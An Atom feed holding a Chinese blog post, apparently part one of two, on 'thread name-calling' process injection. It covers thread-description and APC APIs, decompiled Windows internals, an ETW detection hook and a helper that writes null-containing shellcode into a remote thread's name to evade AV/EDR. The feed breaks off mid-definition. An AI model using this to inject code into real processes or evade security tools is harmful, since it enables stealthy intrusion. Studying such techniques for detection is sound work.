<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>卡卡罗特取西经</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-10-10T13:07:21.384Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>ybdt</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>高级进程注入之利用线程名和APC</title>
    <link href="http://example.com/2025/10/10/%E9%AB%98%E7%BA%A7%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%88%A9%E7%94%A8%E7%BA%BF%E7%A8%8B%E5%90%8D%E5%92%8CAPC/"/>
    <id>http://example.com/2025/10/10/%E9%AB%98%E7%BA%A7%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%88%A9%E7%94%A8%E7%BA%BF%E7%A8%8B%E5%90%8D%E5%92%8CAPC/</id>
    <published>2025-10-10T13:05:43.000Z</published>
    <updated>2025-10-10T13:07:21.384Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>进程注入是攻击方武器库中最重要的技术之一，本文将会介绍如何使用线程描述相关的API实现绕过AV/EDR的进程注入，最后会提供相应的检测方式。（线程描述相关的API，线程描述和线程名是一个意思）</p><p>进程注入是高级恶意软件中一定会使用的技术，它的用途包括：<br>1、AV/EDR躲避：隐藏恶意代码在一个合法的进程中<br>2、操作现有进程：经典的就是lsass进程的dump<br>3、权限提升</p><p>由于读取现有进程的内存危害很大，所以各种AV/EDR都会重点监控并阻止这个行为，不过监控也是基于已知的技术，一旦有未知技术，AV/EDR将很难监控，这本质是一个猫鼠游戏，并且永远不会结束。攻击方一直在尝试使用新技术躲避检测，比如在2016年FortiGuard Labs公开的<a href="https://www.fortinet.com/blog/threat-research/atombombing-brand-new-code-injection-technique-for-windows">原子爆炸技术</a>，它使用<a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globaladdatoma">原子表</a>传递代码到远程进程中，再比如2023年SafeBreach公开的<a href="https://www.safebreach.com/blog/process-injection-using-windows-thread-pools">池聚会技术</a>，线程池被滥用在远程进程的上下文执行代码，想了解各种注入技术，可以查看2019年BlackHat UAS中分享的<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf">Windows Process Injection in 2019</a></p><p>本文要介绍的技术称之为“线程名调用”，这项技术允许植入shellcode到一个远程进程中，通过下列的API：<br>1、GetThreadDescription/SetThreadDescription（Windows 10 1607中引入的），用于获取/设置线程描述<br>2、ZwQueueApcThreadEx2（Windows 10 19045中引入的），APC相关的一个新型API</p><p>这项技术中，在远程进程中分配内存并写入shellcode是通过没有写权限的handle实现，关于进程访问权限的概念，可以查看<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">这里</a>，由于这个特性以及我们使用的API不是进程注入中常用的API，我们可以绕过多数的AV/EDR，下面的内容中，我们将阐述这项技术的实现细节，以及对应的检测方法</p><p>由于内容较多，本文分为上下两部分</p><h1 id="线程名在攻击中的各种场景"><a href="#线程名在攻击中的各种场景" class="headerlink" title="线程名在攻击中的各种场景"></a>线程名在攻击中的各种场景</h1><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><p>IPC全称Inter-Process Communication，意思是进程间通信，比如C2开发中，内部各个模块间的通信就要用到IPC，线程名可以作为两个通信进程的“邮箱”，发送方进程发送信息通过设置线程描述，也就是SetThreadDescription，接收方进程接收信息通过获取线程描述，也就是GetThreadDescription，具体实现可以参考：<a href="https://github.com/LloydLabs/dearg-thread-ipc-stealth">https://github.com/LloydLabs/dearg-thread-ipc-stealth</a></p><h3 id="躲避内存扫描"><a href="#躲避内存扫描" class="headerlink" title="躲避内存扫描"></a>躲避内存扫描</h3><p>AV/EDR会扫描可疑进程的内存，来匹配内存中的shellcode是否是已知恶意软件的IoC，为此我们需要躲避内存扫描。已公开的方案是，shellcode不使用时对其进行加密，如果借助线程名的话，可以在不使用时将shellcode存到线程名中，由于线程名是一个内核模式结构，天然的可以躲避用户模式的内存扫描，具体实现可以参考：<a href="https://gitlab.com/ORCA000/t.d.p">https://gitlab.com/ORCA000/t.d.p</a></p><h3 id="辅助内核模式利用"><a href="#辅助内核模式利用" class="headerlink" title="辅助内核模式利用"></a>辅助内核模式利用</h3><p>借助线程名，可以在用户层为内核层分配内存空间，以方便进一步的内核模式利用，具体实现可以参考：<a href="https://web.archive.org/web/20221009194014/https://blahcat.github.io/posts/2019/03/17/small-dumps-in-the-big-pool.html">https://web.archive.org/web/20221009194014/https://blahcat.github.io/posts/2019/03/17/small-dumps-in-the-big-pool.html</a></p><h3 id="进程注入-之-双管枪"><a href="#进程注入-之-双管枪" class="headerlink" title="进程注入 之 双管枪"></a>进程注入 之 双管枪</h3><p>这项技术是2022年由Sam Russel发布，通过线程劫持的变种实现代码注入，重定向线程执行到一个ROP链，这个ROP链就是通过线程名传递内容实现，这项技术没有创建额外的可执行内存空间，因此可以躲避一些安全检测，缺点是shellcode需要符合特定Windows版本（这是一个硬编码的ROP链，也就是说需要特定的Windows版本），以及shellcode执行后可能导致目标应用程序不稳定，最后是使用了直接对线程操作的API，导致容易触发告警，代码实现：<a href="https://www.lodsb.com/shellcode-injection-using-threadnameinformation">https://www.lodsb.com/shellcode-injection-using-threadnameinformation</a></p><h3 id="进程注入-之-线程名调用"><a href="#进程注入-之-线程名调用" class="headerlink" title="进程注入 之 线程名调用"></a>进程注入 之 线程名调用</h3><p>就是本篇文章要介绍的技术，要注入的代码通过线程描述发送到目标进程，接下来让目标进程通过APC调用GetThreadDescription，来将线程描述拷贝到目标进程内存中，修改内存为可执行，最终通过另外一个APC来执行它，这项技术对shellcode没有限制，也不会干扰原始线程，目标应用程序会继续它的执行。</p><h3 id="DLL注入变种"><a href="#DLL注入变种" class="headerlink" title="DLL注入变种"></a>DLL注入变种</h3><p>通常的DLL注入，是将要注入的DLL地址写到目标进程的地址空间中，然后远程调用LoadLibrary执行目标进程中的DLL，相比较经典的DLL注入使用VirtualAllocEx和WriteProcessMemory，在这里DLL的路径通过线程名传递</p><h1 id="使用的API"><a href="#使用的API" class="headerlink" title="使用的API"></a>使用的API</h1><p>先看一下这项技术用到的API，理解它们的实现细节，对于使用它们攻击以及针对它们防守至关重要。</p><h3 id="GetThreadDescription-SetThreadDescription"><a href="#GetThreadDescription-SetThreadDescription" class="headerlink" title="GetThreadDescription / SetThreadDescription"></a>GetThreadDescription / SetThreadDescription</h3><p>从Windows 10 1607开始，下面的API被添加到Windows中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HRESULT GetThreadDescription(</span><br><span class="line"> [in] HANDLE hThread,</span><br><span class="line"> [out] PWSTR *ppszThreadDescription </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">HRESULT SetThreadDescription(</span><br><span class="line"> [in] HANDLE hThread,</span><br><span class="line"> [in] PCWSTR lpThreadDescription </span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这两个函数被创建是用于设置/获取线程描述，有助于调试中识别某个线程功能。当我们从攻击方视角查看这个API，可以发现一些用途，想要对线程设置描述，需要打开一个带有THREAD_SET_LIMITED_INFORMATION标识的线程句柄，然后我们就可以关联我们的内存缓冲区和远程进程的任意线程，另外缓冲区必须是Unicode字符串，那意味着缓冲区需要以L’\0’结尾，我们可以申请的尺寸是0x10000，是65536字节，根据经验，我们可以使用65536-2字节，约等于16个页（每个页是4Kb）的大小，这是非常充足的容纳shellcode</p><h3 id="API实现"><a href="#API实现" class="headerlink" title="API实现"></a>API实现</h3><p>这两个API实现在Kernelbase.dll中，其中SetThreadDescripton的实现细节如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#define ThreadNameInformation 0x26</span><br><span class="line"></span><br><span class="line">HRESULT __stdcall SetThreadDescription(HANDLE hThread, PCWSTR lpThreadDescription)</span><br><span class="line">&#123;</span><br><span class="line">  NTSTATUS status; // eax</span><br><span class="line">  struct _UNICODE_STRING DestinationString;</span><br><span class="line"></span><br><span class="line">  status = RtlInitUnicodeStringEx(&amp;DestinationString, lpThreadDescription);</span><br><span class="line">  if ( status &gt;= 0 )</span><br><span class="line">    status = NtSetInformationThread(hThread, ThreadNameInformation, &amp;DestinationString, 0x10u);</span><br><span class="line">  return status | 0x10000000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这个函数需要2个参数，一个是线程指针，另一个是包含Unicode字符串的缓冲区，并且将Unicode字符串转换为UNICODE_STRING结构，为线程设置字符串是通过NtSetInformationThread实现的，返回的结果将NTSTATUS类型的status转换为HRESULT类型。在下面的shellcode写入远程进程中，我们通过在远程线程上调用SetThreadDescription实现。</p><p>GetThreadDescription的实现细节如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">HRESULT __stdcall GetThreadDescription(HANDLE hThread, PWSTR *ppszThreadDescription)</span><br><span class="line">&#123;</span><br><span class="line">  SIZE_T struct_len; // rbx</span><br><span class="line">  SIZE_T struct_size; // r8</span><br><span class="line">  NTSTATUS res; // eax</span><br><span class="line">  NTSTATUS status; // ebx</span><br><span class="line">  const UNICODE_STRING *struct_buf; // rdi</span><br><span class="line">  ULONG ReturnLength; // [rsp+58h] [rbp+10h] BYREF</span><br><span class="line"></span><br><span class="line">  *ppszThreadDescription = nullptr;</span><br><span class="line">  LODWORD(struct_len) = 144;</span><br><span class="line">  RtlFreeHeap(NtCurrentPeb()-&gt;ProcessHeap, 0, 0);</span><br><span class="line">  for ( struct_size = 146; ; struct_size = struct_len + 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    struct_buf = (const UNICODE_STRING *)RtlAllocateHeap(NtCurrentPeb()-&gt;ProcessHeap, 0, struct_size);</span><br><span class="line">    if ( !struct_buf )</span><br><span class="line">    &#123;</span><br><span class="line">      status = 0xC0000017;</span><br><span class="line">      goto finish;</span><br><span class="line">    &#125;</span><br><span class="line">    res = NtQueryInformationThread(</span><br><span class="line">            hThread,</span><br><span class="line">            ThreadNameInformation,</span><br><span class="line">            (PVOID)struct_buf,</span><br><span class="line">            struct_len,</span><br><span class="line">            &amp;ReturnLength);</span><br><span class="line">    status = res;</span><br><span class="line">    if ( res != 0xC0000004 &amp;&amp; res != 0xC0000023 &amp;&amp; res != 0x80000005 )</span><br><span class="line">      break;</span><br><span class="line">    struct_len = ReturnLength;</span><br><span class="line">    RtlFreeHeap(NtCurrentPeb()-&gt;ProcessHeap, 0, (PVOID)struct_buf);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( res &gt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    ReturnLength = struct_buf-&gt;Length;</span><br><span class="line">    // move the buffer to the beginning of the structure</span><br><span class="line">    memmove_0((void *)struct_buf, struct_buf-&gt;Buffer, ReturnLength);</span><br><span class="line">    // null terminate the buffer</span><br><span class="line">    *(&amp;struct_buf-&gt;Length + ((unsigned __int64)ReturnLength &gt;&gt; 1)) = 0;</span><br><span class="line">    // fill in the passed pointer</span><br><span class="line">    *ppszThreadDescription = &amp;struct_buf-&gt;Length;</span><br><span class="line">    struct_buf = 0i64;</span><br><span class="line">  &#125;</span><br><span class="line">finish:</span><br><span class="line">  RtlFreeHeap(NtCurrentPeb()-&gt;ProcessHeap, 0, (PVOID)struct_buf);</span><br><span class="line">  return status | 0x10000000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析这个函数可以发现一些有趣的细节，在目标进程中装有线程描述的缓冲区位于堆上，函数会自动分配一个UNICODE_STRING大小的尺寸，初始化后，将UNICODE_STRING转化为一个简单的宽字符串（以null作为结尾），然后指向新缓冲区的指针返回给调用者传递的变量，就是PWSTR *ppszThreadDescription。</p><h3 id="UNICODE-STRING位置"><a href="#UNICODE-STRING位置" class="headerlink" title="UNICODE_STRING位置"></a>UNICODE_STRING位置</h3><p>查看上面的代码实现可以注意到，调用GetThreadDescription后在目标进程缓冲区中的线程描述只是拷贝，那原始的UNICODE_STRING在哪？想要了解更多，我们需要查看Windows内核ntoskrnl.exe，进而发现SetThreadDescription/GetThreadDescription的syscall实现（NtSetInformationThread and NtQueryInformationThread），可以看到原始的UNICODE_STRING存储在内核模式，位于ETHREAD-&gt;ThreadName</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lkd&gt; dt nt!_ETHREAD</span><br><span class="line">[...]</span><br><span class="line">+0x610 ThreadName       : Ptr64 _UNICODE_STRING</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>内核模式中，负责设置线程名的NtSetInformationThread的部分代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">          Length = Src.Length;</span><br><span class="line">          if ( (Src.Length &amp; 1) != 0 || Src.Length &gt; Src.MaximumLength )</span><br><span class="line">          &#123;</span><br><span class="line">            status = 0xC000000D; // STATUS_INVALID_PARAMETER -&gt; invalid buffer size supplied</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            PoolWithTag = ExAllocatePoolWithTag(NonPagedPoolNx, Src.Length + 16i64, &#x27;mNhT&#x27;); // allocating a buffer on non paged pool, with tag &#x27;ThNm&#x27;</span><br><span class="line">            threadName = PoolWithTag;</span><br><span class="line">            v113 = PoolWithTag;</span><br><span class="line">            if ( PoolWithTag )</span><br><span class="line">            &#123;</span><br><span class="line">              p_Length = &amp;PoolWithTag[1].Length;</span><br><span class="line">              threadName-&gt;Buffer = p_Length;</span><br><span class="line">              threadName-&gt;Length = Length;</span><br><span class="line">              threadName-&gt;MaximumLength = Length;</span><br><span class="line">              memmove(p_Length, Src.Buffer, Length);</span><br><span class="line">              eThread = Object;</span><br><span class="line">              PspLockThreadSecurityExclusive(Object, CurrentThread);</span><br><span class="line">              v105 = 1;</span><br><span class="line">              P = eThread-&gt;ThreadName;</span><br><span class="line">              eThread-&gt;ThreadName = threadName;</span><br><span class="line">              threadName = 0i64;</span><br><span class="line">              v113 = 0i64;</span><br><span class="line">              EtwTraceThreadSetName(eThread);</span><br><span class="line">              goto finish;</span><br><span class="line">            &#125;</span><br><span class="line">            status = 0xC000009A;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          status = 0xC0000004;</span><br><span class="line">        &#125;</span><br><span class="line">        v104 = status;</span><br><span class="line">finish:</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>可以看到，缓冲区被分配在NonPagedPoolNx（不可执行的，非页面的池），分配的缓冲区被UNICODE_STRING填充，缓冲区的指针位于ETHREAD中的ThreadName。</p><p>可以看到设置线程名已经被ETW注册，因此我们可以使用它来检测这项技术，生成的事件数据包括进程ID、线程ID、等，这些数据可以用来标识线程和线程描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall EtwTraceThreadSetName(_ETHREAD *thread)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // r10d</span><br><span class="line">  _UNICODE_STRING *ThreadName; // rax</span><br><span class="line">  __int64 *Buffer; // rcx</span><br><span class="line">  unsigned int Length; // edx</span><br><span class="line">  unsigned __int64 len; // rax</span><br><span class="line">  int v7[4]; // [rsp+30h] [rbp-50h] BYREF</span><br><span class="line">  __int64 v8[2]; // [rsp+40h] [rbp-40h] BYREF</span><br><span class="line">  __int64 *buf; // [rsp+50h] [rbp-30h]</span><br><span class="line">  __int64 v10; // [rsp+58h] [rbp-28h]</span><br><span class="line">  __int64 *v11; // [rsp+60h] [rbp-20h]</span><br><span class="line">  __int64 v12; // [rsp+68h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v7[0] = thread-&gt;Cid.UniqueProcess;</span><br><span class="line">  v1 = 2;</span><br><span class="line">  v7[1] = thread-&gt;Cid.UniqueThread;</span><br><span class="line">  v8[0] = v7;</span><br><span class="line">  ThreadName = thread-&gt;ThreadName;</span><br><span class="line">  v7[2] = 0;</span><br><span class="line">  v8[1] = 8i64;</span><br><span class="line">  if ( ThreadName &amp;&amp; (Buffer = ThreadName-&gt;Buffer) != 0i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    Length = ThreadName-&gt;Length;</span><br><span class="line">    len = 0x800i64;</span><br><span class="line">    if ( Length &lt; 0x800u )</span><br><span class="line">      len = Length;</span><br><span class="line">    buf = Buffer;</span><br><span class="line">    v10 = len;</span><br><span class="line">    if ( !len || *(Buffer + (len &gt;&gt; 1) - 1) )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = 2i64;</span><br><span class="line">      v11 = &amp;EtwpNull;</span><br><span class="line">      v1 = 3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = 2i64;</span><br><span class="line">    buf = &amp;EtwpNull;</span><br><span class="line">  &#125;</span><br><span class="line">  return EtwTraceKernelEvent(v8, v1, 2, 1352, 0x501802);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中，一些基本概念的解释<br>__int64：表示Windows平台下64位有符号整数<br>__fastcall：和__stdcall类似的调用约定，前两个参数通过寄存器传递，其余参数从右向左入栈，由子函数清理堆栈<br>int：表示有符号整型<br>unsinged int：表示无符号整型<br>2i64：表示64位有符号整数常量，意味着即使是32位系统中也会被强制解释为64位有符号整数<br>0x800i64：表示十六进制形式的800，其他和2i64一样</p><h3 id="移除空字节限制"><a href="#移除空字节限制" class="headerlink" title="移除空字节限制"></a>移除空字节限制</h3><p>使用Windows官方的API设置线程名时，会对名称的字符有一些限制，名称必须是有效的Unicode字符串，有效意味着以一个空的WCHAR字符作为结尾。一个WCHAR字符占用2字节，一个空的WCHAR字符也占用2字节，也就是说，如果我们的shellcode中有2个连续NULL字符（一个NULL字符占1个字节），那么后面的部分将被忽略。每当shellcode需要通过装有字符串的缓冲区传递时，都会遇到这个问题。为了解决这个问题，shellcode编码器被发明出来，它们可以将缓冲区转换为不含空字节的格式。</p><p>但是通过分析上面的API，我们发现可以从根本上解决这个限制，当线程描述在不同缓冲区之间复制时，将使用UNICODE_STRING结构中声明的长度，并且使用memmove函数拷贝时，该函数不将NULL字节视为终止符。唯一使用NULL字节作为终止符的是SetThreadDescription，但是在底层实现中，它调用RtlInitUnicodeStringEx，使用宽字符来初始化UNICODE_STRING结构，输入缓冲区一定是NULL字节作为终止符，以及长度是通过NULL字节决定的。</p><p>这个函数初始化UNICODE_STRING，基于指定长度的虚假缓冲区，并且填充它使用实际的内容（可能会包含空字节），然后使用低级API NtSetInformationThread将准备好的UNICODE_STRING传递给线程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HRESULT mySetThreadDescription(HANDLE hThread, const BYTE* buf, size_t buf_size) &#123;</span><br><span class="line">    UNICODE_STRING DestinationString = &#123; 0 &#125;;</span><br><span class="line">    BYTE* padding = (BYTE*)::calloc(buf_size + sizeof(WCHAR), 1)</span><br><span class="line">    ::memset(padding, &#x27;A&#x27;, buf_size);</span><br><span class="line"></span><br><span class="line">    auto pRtlInitUnicodeStringEx = reinterpret_cast&lt;decltype(&amp;RtlInitUnicodeStringEx)&gt;(</span><br><span class="line">        GetProcAddress(GetModuleHandle(&quot;ntdll.dll&quot;), &quot;RtlInitUnicodeStringEx&quot;)</span><br><span class="line">    );</span><br><span class="line">    pRtlInitUnicodeStringEx(&amp;Destination, (PCWSTR)padding);</span><br><span class="line">    ::memcpy(DestinationString.Buffer, buf, buf_size);</span><br><span class="line"></span><br><span class="line">    auto pNtSetInformationThread = reinterpret_cast&lt;decltype(*NtSetInformationThread)&gt;(</span><br><span class="line">        GetProcAddress(GetModuleHandle(&quot;ntdll.dll&quot;), &quot;NtSetInformationThread&quot;)</span><br><span class="line">    );</span><br><span class="line">    NTSTATUS status = pNtSetInformationThread(hThread, (THREADINFOCLASS)(ThreadNameInformation), &amp;DestinationString, 0x10u);</span><br><span class="line">    ::free(padding);</span><br><span class="line"></span><br><span class="line">    return HRESULT_FROM_NT(status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="NtQueueApcThreadEx2"><a href="#NtQueueApcThreadEx2" class="headerlink" title="NtQueueApcThreadEx2"></a>NtQueueApcThreadEx2</h3><p>想要实现进程注入，就需要在目标进程中调用API，Windows支持添加函数到现有线程的APC队列中，让我们能够在远程进程运行代码，而无需创建线程，在底层这个函数是NtQueueApcThreadEx或者NtQueueApcThread，NtQueueApcThreadEx是Windows Vista及之后引入的，NtQueueApcThread是Windows XP及之前使用的，从名字就能知道，NtQueueApcThreadEx是扩展版本，功能更多。对应的Win32 API是QueueUserAPC。只要线程句柄被打开时带有THREAD_SET_CONTEXT权限，我们就可以向远程线程的队列中添加函数。</p><p>APC注入相关的API经常被用在各种新老注入技术中，可以看一下MITRE矩阵中APC的部分，APC允许在已经存在的远程线程中运行代码，相比创建一个远程线程的方式更隐蔽，创建一个新的线程通常会触发AV/EDR在内核层部署的回调函数PsSetCreateThreadNotifyRoutine/PsSetCreateThreadNotifyRoutineEx。而且，APC在传参方面更加灵活，创建线程我们只能传递一个参数，使用APC的方式我们可以传递3个参数。</p><p>直接使用NtQueueApcThread有一个缺点，想要添加函数到APC队列中，前提是我们需要发现一个处于alertable状态的线程，因为仅当线程处于alertable状态时才会执行我们添加到APC队列的函数。依赖alertable状态的线程限制了我们对目标的选择，并且寻找目标也增加了注入器的复杂性。</p><p>幸运的是，新版APC被引入Windows后有了一个解决方案，是QUEUE_USER_APC_FLAGS。QUEUE_USER_APC_FLAGS是一个枚举类型，在QueueUserAPC2函数中使用，这两个东西都是Windows 10中新引入的，之前的系统中没有，定义如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">BOOL QueueUserAPC2(</span><br><span class="line">    PAPCFUNC pfnAPC,                // APC 回调函数（待执行的代码）</span><br><span class="line">    HANDLE hThread,                 // 目标线程句柄</span><br><span class="line">    ULONG_PTR dwData,               // 传递给 APC 回调的参数</span><br><span class="line">    QUEUE_USER_APC_FLAGS Flags      // 标志位（QUEUE_USER_APC_FLAGS 枚举值）</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef enum _QUEUE_USER_APC_FLAGS &#123;</span><br><span class="line">  QUEUE_USER_APC_FLAGS_NONE,</span><br><span class="line">  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,</span><br><span class="line">  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT</span><br><span class="line">&#125; QUEUE_USER_APC_FLAGS;</span><br><span class="line">虽然定义4个值，一般用到的就是QUEUE_USER_APC_FLAGS_NONE 和 QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC</span><br><span class="line">QUEUE_USER_APC_FLAGS_NONE：表示需要alertable才能触发的常规APC</span><br><span class="line">QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC：表示无需alertable，只需触发特定系统事件即可触发</span><br><span class="line"></span><br><span class="line">参考链接：</span><br><span class="line">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc2</span><br><span class="line">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags</span><br></pre></td></tr></table></figure><p>现在我们梳理一下这几个API的关系：<br>Windows NT 4.0引入内核态API NtQueueApcThread，对应的用户态API是QueueUserAPC<br>Windows Vista引入内核态API NtQueueApcThreadEx，无对应的用户态API<br>Windows 10 1703引入用户态API QueueUserAPC2，对应的内核态API是NtQueueApcThreadEx<br>Windows 10 1903引入内核态API NtQueueApcThreadEx2，无对应的用户态API<br>在NtQueueApcThreadEx中有一个参数ReserveHandle，后期被微软替换为UserApcOption，UserApcOption是一个结构体，它们的原型如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">NtQueueApcThreadEx(</span><br><span class="line">    _In_ HANDLE ThreadHandle,</span><br><span class="line">    _In_opt_ HANDLE ReserveHandle, // NtAllocateReserveObject // QUEUE_USER_APC_SPECIAL_USER_APC</span><br><span class="line">    _In_ PPS_APC_ROUTINE ApcRoutine, // RtlDispatchAPC</span><br><span class="line">    _In_opt_ PVOID ApcArgument1,</span><br><span class="line">    _In_opt_ PVOID ApcArgument2,</span><br><span class="line">    _In_opt_ PVOID ApcArgument3</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef struct _USER_APC_OPTION &#123;</span><br><span class="line">    ULONG Flags;          // APC 行为控制标志</span><br><span class="line">    HANDLE ReservedHandle; // 保留字段，兼容早期 ReverseHandle 功能</span><br><span class="line">    // 其他扩展字段（如 APC 优先级、触发条件等）</span><br><span class="line">&#125; 